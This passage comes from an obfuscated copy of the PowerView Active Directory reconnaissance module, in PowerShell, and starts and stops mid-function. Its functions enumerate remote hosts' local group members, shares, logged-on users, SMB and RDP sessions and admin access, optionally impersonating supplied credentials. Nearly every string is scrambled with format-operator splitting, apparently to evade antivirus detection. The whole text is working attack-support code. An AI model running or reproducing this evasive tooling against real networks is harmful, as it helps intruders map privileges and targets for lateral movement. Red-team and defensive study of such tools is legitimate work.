            $GptTmplPath = $GPO.gpcfilesyspath + ((("{4}{9}{1}{3}{2}{8}{11}{7}{10}{6}{5}{0}{12}" -f'SecEdit','Z','Micro','p','r','p','rZ','Wi','sof','ZpMACHINEr','ndows NT','trZp','rZpGptTmpl.inf')) -RepLacE ([chAR]114+[chAR]90+[chAR]112),[chAR]92)

            $ParseArgs =  @{
                ("{2}{1}{0}" -f 'h','tTmplPat','Gp') = $GptTmplPath
                ("{3}{1}{0}{2}"-f 'e','utputObj','ct','O') = $True
            }
            if ($PSBoundParameters[("{2}{3}{0}{1}"-f'd','ential','C','re')]) { $ParseArgs[("{0}{3}{2}{1}" -f'Crede','al','ti','n')] = $Credential }

            
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty ("{0}{1}" -f 'G','POName') $GPO.name
                $_ | Add-Member Noteproperty ("{3}{0}{1}{2}" -f 'PO','Displ','ayName','G') $GPO.displayname
                $_
            }
        }
    }
}










function Get-NetLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}" -f'PS','uldProcess','Sho'}, '')]
    [OutputType({"{5}{4}{0}{2}{1}{3}"-f'ew.L','roup','ocalG','.API','Vi','Power'})]
    [OutputType({"{2}{5}{3}{1}{0}{6}{4}" -f 'alGro','Loc','Po','erView.','NT','w','up.Win'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{1}{0}"-f 'stName','o','H'}, {"{0}{2}{1}" -f'd','me','nshostna'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', {"{0}{1}"-f 'WinN','T'})]
        [Alias({"{4}{3}{1}{0}{2}"-f'et','ctionM','hod','e','Coll'})]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{2}{0}{1}" -f 'n','tial','Crede')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                

                
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                
                $Offset = $PtrInfo.ToInt64()

                
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty ("{3}{1}{0}{2}"-f 'uterNam','p','e','Com') $Computer
                        $LocalGroup | Add-Member Noteproperty ("{2}{0}{1}"-f 'rou','pName','G') $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty ("{1}{2}{0}"-f'nt','Com','me') $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, ("{2}{0}{6}{5}{3}{4}{1}"-f 'ow','API','P','calGro','up.','w.Lo','erVie'))
                        $LocalGroup
                    }
                    
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq ("{0}{1}"-f 'gr','oup') } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty ("{2}{0}{3}{1}"-f'o','erName','C','mput') $Computer
                    $Group | Add-Member Noteproperty ("{0}{2}{1}" -f'Gr','e','oupNam') ($LocalGroup.InvokeGet(("{1}{0}" -f'e','Nam')))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet(("{1}{2}{0}" -f 'd','obje','ctsi')),0)).Value)
                    $Group | Add-Member Noteproperty ("{2}{0}{1}"-f 'mm','ent','Co') ($LocalGroup.InvokeGet(("{1}{2}{0}" -f'on','Desc','ripti')))
                    $Group.PSObject.TypeNames.Insert(0, ("{6}{3}{2}{1}{4}{0}{5}"-f '.WinN','alGr','w.Loc','erVie','oup','T','Pow'))
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}" -f'SShoul','dPro','cess','P'}, '')]
    [OutputType({"{4}{1}{2}{5}{0}{3}"-f'oupMember.A','View.','Loc','PI','Power','alGr'})]
    [OutputType({"{8}{9}{3}{2}{5}{0}{6}{7}{1}{4}"-f'roup','i','w.','e','nNT','LocalG','Member.','W','PowerV','i'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}" -f'HostNa','me'}, {"{0}{1}{3}{2}" -f 'dn','s','ame','hostn'}, {"{0}{1}"-f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = ("{2}{0}{4}{3}{1}"-f'mini','s','Ad','ator','str'),

        [ValidateSet('API', {"{0}{1}"-f 'Wi','nNT'})]
        [Alias({"{3}{0}{1}{4}{2}" -f'ollect','io','hod','C','nMet'})]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{2}{1}{0}" -f'tial','en','Cred')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                

                
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty ("{1}{2}{0}{3}" -f 'put','Co','m','erName') $Computer
                            $Member | Add-Member Noteproperty ("{2}{0}{1}"-f 'oupNam','e','Gr') $GroupName
                            $Member | Add-Member Noteproperty ("{2}{1}{0}" -f 'e','emberNam','M') $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty 'SID' $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq ("{2}{1}{0}"-f 'p','ypeGrou','SidT'))
                            $Member | Add-Member Noteproperty ("{1}{2}{0}"-f'Group','I','s') $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, ("{3}{0}{2}{5}{1}{4}" -f 'L','embe','oc','PowerView.','r.API','alGroupM'))
                            $Members += $Member
                        }
                    }

                    
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    
                    $MachineSid = $Members | Where-Object {$_.SID -match ("{1}{0}" -f'00','.*-5') -or ($_.SID -match ("{2}{0}{1}"-f'0','1','.*-5'))} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty ("{0}{1}" -f'IsDoma','in') $False
                            }
                            else {
                                $_ | Add-Member Noteproperty ("{1}{0}{2}" -f 's','I','Domain') $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch ("{2}{0}{1}" -f'-5-','21','S-1')) {
                                $_ | Add-Member Noteproperty ("{2}{0}{1}" -f 'a','in','IsDom') $False
                            }
                            else {
                                $_ | Add-Member Noteproperty ("{1}{0}"-f 'sDomain','I') ("{0}{1}"-f'UNKN','OWN')
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke(("{0}{1}{2}" -f 'Mem','b','ers')) | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty ("{0}{2}{1}{3}" -f 'C','rNam','ompute','e') $Computer
                        $Member | Add-Member Noteproperty ("{2}{1}{0}"-f'e','pNam','Grou') $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet(("{0}{1}" -f'Ad','sPath')).Replace(("{0}{1}{2}" -f'W','inNT','://'), '')
                        $IsGroup = ($LocalUser.SchemaClassName -like ("{0}{1}"-f'grou','p'))

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | Add-Member Noteproperty ("{0}{2}{1}{3}" -f'Accou','N','nt','ame') $Name
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet(("{1}{0}{2}"-f'S','Object','ID')),0)).Value)
                        $Member | Add-Member Noteproperty ("{0}{1}"-f'Is','Group') $IsGroup
                        $Member | Add-Member Noteproperty ("{0}{1}{2}" -f 'IsDo','mai','n') $MemberIsDomain

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        $Member
                    }
                }
                catch {
                    Write-Verbose ('[Get-Net'+'Local'+'Grou'+'pMem'+'b'+'e'+'r] '+'E'+'rror '+'for'+' '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {


    [OutputType({"{1}{2}{6}{0}{3}{5}{4}"-f '.Sh','Powe','r','a','eInfo','r','View'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}"-f 'tName','Hos'}, {"{1}{3}{2}{0}"-f'tname','d','hos','ns'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{2}{0}{1}"-f 'ocalh','ost','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{1}{2}{0}"-f'l','Credenti','a')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $SHARE_INFO_1::GetSize()

                
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty ("{0}{2}{1}{3}" -f'Co','am','mputerN','e') $Computer
                    $Share.PSObject.TypeNames.Insert(0, ("{1}{3}{2}{0}" -f 'eInfo','P','View.Shar','ower'))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {


    [OutputType({"{1}{0}{3}{5}{2}{4}"-f'w','Po','.LoggedOnUse','erVie','rInfo','w'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}" -f'tName','Hos'}, {"{0}{1}{2}" -f'dns','hostna','me'}, {"{0}{1}" -f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{1}{0}" -f 'lhost','loca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{0}{2}{1}{3}" -f 'C','den','re','tial')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $WKSTA_USER_INFO_1::GetSize()

                
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty ("{1}{0}{2}"-f 'ut','Comp','erName') $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, ("{0}{5}{7}{2}{1}{4}{3}{6}" -f'PowerV','O','d','U','n','iew.L','serInfo','ogge'))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {


    [OutputType({"{3}{4}{0}{2}{1}" -f's','nfo','ionI','PowerView.S','es'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}" -f'stName','Ho'}, {"{2}{0}{1}"-f'h','ostname','dns'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{0}{2}{1}"-f'local','st','ho'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{1}{2}{0}" -f'al','Creden','ti')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            
            $Offset = $PtrInfo.ToInt64()

            
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                
                $Increment = $SESSION_INFO_10::GetSize()

                
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty ("{3}{1}{2}{0}"-f 'me','rN','a','Compute') $Computer
                    $Session.PSObject.TypeNames.Insert(0, ("{3}{2}{1}{0}"-f'fo','In','ession','PowerView.S'))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{4}{0}"-f 'ess','P','ldP','SShou','roc'}, '')]
    [OutputType({"{0}{4}{2}{3}{1}" -f 'PowerVi','er','RegL','oggedOnUs','ew.'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}" -f'me','HostNa'}, {"{0}{1}{2}" -f 'dnshost','nam','e'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{0}{1}{2}"-f 'local','hos','t')
    )

    BEGIN {
        if ($PSBoundParameters[("{0}{1}{3}{2}" -f'Cr','eden','ial','t')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(("{1}{0}"-f 'rs','Use'), "$ComputerName")

                
                $Reg.GetSubKeyNames() | Where-Object { $_ -match (('S'+'-1-5-21-[0-9]+-['+'0-'+'9]+-'+'[0-9]+-['+'0-9]+DM'+'J').RepLAcE('DMJ','$')) } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType ("{2}{0}{1}"-f 'ma','inSimple','Do')

                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty ("{1}{0}{2}{3}" -f 'e','Comput','rNam','e') "$ComputerName"
                    $RegLoggedOnUser | Add-Member Noteproperty ("{0}{2}{1}" -f 'Use','n','rDomai') $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty ("{1}{0}" -f 'ame','UserN') $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty ("{2}{0}{1}" -f 'serS','ID','U') $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, ("{3}{0}{4}{5}{2}{1}"-f 'erV','er','w.RegLoggedOnUs','Pow','i','e'))
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose ('[Get-RegL'+'o'+'ggedOn]'+' '+'Erro'+'r '+'open'+'ing'+' '+'r'+'emo'+'te '+'re'+'gistry'+' '+'on'+' '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {


    [OutputType({"{5}{6}{3}{1}{0}{2}{7}{4}"-f'S','P','e','RD','nfo','Pow','erView.','ssionI'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}{2}" -f 'Hos','tNa','me'}, {"{3}{0}{2}{1}" -f'ns','stname','ho','d'}, {"{1}{0}"-f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{3}{2}{1}{0}"-f 'host','cal','o','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{0}{3}{2}{1}" -f'Creden','l','a','ti')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            
            if ($Handle -ne 0) {

                
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                
                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    
                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    
                    for ($i = 0; ($i -lt $pCount); $i++) {

                        
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object PSObject

                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty ("{0}{1}{3}{2}"-f 'C','o','Name','mputer') $Info.pHostName
                        }
                        else {
                            
                            $RDPSession | Add-Member Noteproperty ("{0}{1}{2}"-f 'Co','mput','erName') $Computer
                        }

                        $RDPSession | Add-Member Noteproperty ("{2}{0}{1}" -f 'onN','ame','Sessi') $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            
                            $RDPSession | Add-Member Noteproperty ("{0}{2}{1}"-f'User','e','Nam') "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty ("{2}{1}{0}"-f'e','am','UserN') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                        $RDPSession | Add-Member Noteproperty ("{1}{0}"-f 'ate','St') $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        
                        
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | Add-Member Noteproperty ("{0}{2}{1}" -f'Sou','ceIP','r') $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, ("{5}{4}{2}{7}{1}{0}{6}{3}"-f'nI','RDPSessio','rV','o','owe','P','nf','iew.'))
                            $RDPSession

                            
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose ('[Get-Net'+'RDPSe'+'ssion]'+' '+'Erro'+'r'+' '+'ope'+'ning '+'th'+'e '+'Rem'+'ote '+'Des'+'kto'+'p '+'S'+'ession'+' '+'Hos'+'t '+'('+'RD '+'Se'+'ssion'+' '+'H'+'ost) '+'s'+'e'+'rver '+'fo'+'r: '+"$ComputerName")
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {


    [OutputType({"{2}{3}{1}{0}{4}" -f 'nAcc','.Admi','P','owerView','ess'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}{2}"-f 'o','H','stName'}, {"{1}{0}{2}"-f 'hos','dns','tname'}, {"{0}{1}" -f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{1}{2}{0}" -f'ost','loc','alh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{0}{2}{1}" -f 'Cred','tial','en')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", ("{1}{0}{3}{2}"-f'ervi','S','ctive','cesA'), 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty ("{2}{0}{1}{3}"-f'pu','ter','Com','Name') $Computer

            
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty ("{2}{0}{1}" -f'sAdm','in','I') $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                $IsAdmin | Add-Member Noteproperty ("{0}{1}" -f'IsAdmi','n') $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, ("{0}{3}{1}{2}" -f'Power','w.Ad','minAccess','Vie'))
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {


    [OutputType({"{5}{1}{3}{2}{4}{0}"-f'e','owerVi','o','ew.C','mputerSit','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}" -f'stName','Ho'}, {"{1}{2}{0}"-f'hostname','dn','s'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ("{0}{2}{1}" -f 'l','st','ocalho'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters[("{1}{2}{0}{3}" -f 'denti','C','re','al')]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty ("{3}{1}{2}{0}"-f'rName','o','mpute','C') $Computer
            $ComputerSite | Add-Member Noteproperty ("{1}{2}{0}" -f'ess','IPA','ddr') $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty ("{1}{2}{0}"-f 'e','Si','teNam') $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                $ComputerSite | Add-Member Noteproperty ("{0}{1}"-f'Site','Name') ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, ("{3}{1}{2}{4}{0}" -f'ite','put','er','PowerView.Com','S'))

            
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
